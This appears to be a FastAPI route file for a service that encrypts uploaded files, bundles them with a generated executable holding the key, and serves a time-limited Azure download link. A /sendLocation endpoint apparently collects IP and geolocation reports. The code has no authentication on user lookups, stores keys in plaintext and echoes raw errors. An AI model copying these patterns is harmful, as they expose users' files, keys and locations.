import os
import datetime
import zipfile
from fastapi import APIRouter, File, HTTPException, UploadFile, Depends, Query
from typing import Any, List

from pydantic import BaseModel
from app.database import db
from app.routes.dependencies import get_db
from bson import ObjectId
from azure.storage.blob import BlobServiceClient, generate_blob_sas, BlobSasPermissions
from azure.core.exceptions import ResourceExistsError, ResourceNotFoundError
from app.config.settings import AZURE_STORAGE_CONNECTION_STRING
from app.core.security import encrypt_files
from app.services.exe_generator import generate_exe

router = APIRouter()

blob_service_client = BlobServiceClient.from_connection_string(AZURE_STORAGE_CONNECTION_STRING)
container_name = "test"

# Ensure the container exists
try:
    container_client = blob_service_client.get_container_client(container_name)
    container_client.get_container_properties()
except ResourceNotFoundError:
    container_client = blob_service_client.create_container(container_name)



@router.post("/upload_and_encrypt/")
async def upload_and_encrypt_files(
    files: List[UploadFile] = File(...), 
    username: str = Query(...), 
    db: Any = Depends(get_db)
):
    try:
        os.makedirs('temp', exist_ok=True)
        file_ids = []
        
        # Upload files to Azure Blob Storage
        for file in files:
            file_id = str(ObjectId())
            blob_client = container_client.get_blob_client(blob=file_id)
            
            file_contents = await file.read()
            blob_client.upload_blob(file_contents, blob_type="BlockBlob")
            
            file_ids.append(file_id)
            
            # Save file info to database, including the original file extension
            file_extension = os.path.splitext(file.filename)[1]
            db.files.insert_one({
                "_id": file_id,
                "filename": file.filename,
                "content_type": file.content_type,
                "username": username,
                "original_extension": file_extension  # Save original extension
            })

        # Encrypt files
        encrypted_file_paths, key, file_extensions = encrypt_files(file_ids, db)
        exe_or_script_path = generate_exe(key, encrypted_file_paths, file_extensions, username)


        # Create ZIP file containing encrypted files and EXE/script
        zip_id = str(ObjectId())
        zip_path = f"temp/{zip_id}.zip"
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for file_path in encrypted_file_paths:
                zipf.write(file_path, os.path.basename(file_path))
            zipf.write(exe_or_script_path, os.path.basename(exe_or_script_path))

        # Upload ZIP to Azure Blob Storage
        zip_blob_client = container_client.get_blob_client(blob=zip_id)
        with open(zip_path, "rb") as zip_file:
            zip_blob_client.upload_blob(zip_file.read(), blob_type="BlockBlob")

        # Generate SAS token for ZIP file
        sas_token = generate_blob_sas(
            account_name=blob_service_client.account_name,
            container_name=container_name,
            blob_name=zip_id,
            account_key=blob_service_client.credential.account_key,
            permission=BlobSasPermissions(read=True),
            expiry=datetime.datetime.utcnow() + datetime.timedelta(hours=1)
        )

        zip_url_with_sas = f"{zip_blob_client.url}?{sas_token}"
        
        # Update user's encryptions in database
        db.users.update_one(
            {"username": username},
            {"$push": {"encryptions": {
                "id": zip_id,
                "file_ids": file_ids,
                "key": key.decode(),
                "zip_url": zip_url_with_sas
            }}},
            upsert=True
        )
        
        # Clean up temporary files
        for file_path in encrypted_file_paths:
            os.remove(file_path)
        os.remove(zip_path)
        if os.path.exists(exe_or_script_path):
            os.remove(exe_or_script_path)

        return {
            "zip_id": zip_id,
            "zip_url": zip_url_with_sas
        }

    except ResourceNotFoundError as e:
        print(f"Azure Blob Storage resource not found: {str(e)}")
        raise HTTPException(status_code=500, detail="Azure Blob Storage resource not found. Please check your storage account configuration.")
    except Exception as e:
        print(f"Error during file upload and encryption: {str(e)}")
        raise HTTPException(status_code=500, detail=f"An error occurred during file upload and encryption: {str(e)}")
    
@router.get("/get_download_url/{zip_id}")
async def get_download_url(zip_id: str, username: str, db: Any = Depends(get_db)):
    user = db.users.find_one({"username": username})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    encryption_info = next((e for e in user.get("encryptions", []) if e["id"] == zip_id), None)
    if not encryption_info:
        raise HTTPException(status_code=404, detail="Encryption info not found")
    
    return {"download_url": encryption_info["zip_url"]}


# Define a Pydantic model for the location data
class LocationData(BaseModel):
    ip: str
    city: str
    country: str
    latitude: float
    longitude: float
    region: str

@router.post("/sendLocation")
async def send_location(location: LocationData):
    try:
        # Log the received location data
        print(f"Received location data: {location.json()}")

        # You can perform additional actions with the location data here
        # For example, storing it in a database or sending notifications
        
        return {"message": "Location data received successfully"}
    except Exception as e:
        print(f"Error processing location data: {str(e)}")
        raise HTTPException(status_code=500, detail="An error occurred while processing location data")
